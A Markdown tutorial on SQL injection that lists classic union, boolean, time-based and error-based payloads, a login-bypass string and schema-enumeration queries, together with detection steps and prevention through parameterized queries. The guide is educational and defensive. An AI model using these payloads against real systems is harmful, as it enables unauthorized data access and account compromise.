# SQL Injection Attack Guide

## Overview
SQL injection is a code injection technique that might destroy your database. It is one of the most common web hacking techniques.

## What is SQL Injection?

SQL injection is the placement of malicious code in SQL statements, via web page input.

## Common SQL Injection Patterns

### 1. Union-Based Injection
```sql
' UNION SELECT username, password FROM users --
```

### 2. Boolean-Based Injection
```sql
' OR 1=1 --
```

### 3. Time-Based Injection
```sql
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
```

### 4. Error-Based Injection
```sql
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

## Detection Methods

### Manual Testing
1. **Single Quote Test**: `'`
2. **Double Quote Test**: `"`
3. **Comment Test**: `--`
4. **AND/OR Test**: `1' AND '1'='1`

### Automated Tools
- SQLMap
- Burp Suite
- OWASP ZAP

## Prevention Techniques

### 1. Parameterized Queries
```python
# Safe
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# Unsafe
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### 2. Input Validation
- Whitelist allowed characters
- Validate data types
- Escape special characters

### 3. Stored Procedures
- Use stored procedures instead of dynamic SQL
- Implement proper parameter binding

## Real-World Examples

### Example 1: Login Bypass
```sql
Username: admin'--
Password: anything
```

### Example 2: Data Extraction
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns --
```

### Example 3: Database Enumeration
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database() --
```

## Security Testing Checklist

- [ ] Test all input fields
- [ ] Try various injection techniques
- [ ] Verify error handling
- [ ] Check for blind SQL injection
- [ ] Test secondary order SQL injection

## Impact Assessment

**Low Impact**: Read access to non-sensitive data
**Medium Impact**: Read access to user credentials
**High Impact**: Full database access or deletion
**Critical Impact**: Database server compromise

## References

- OWASP SQL Injection Prevention Cheat Sheet
- MITRE ATT&CK T1190: Exploit Public-Facing Application
- Common Vulnerabilities and Exposures (CVE) database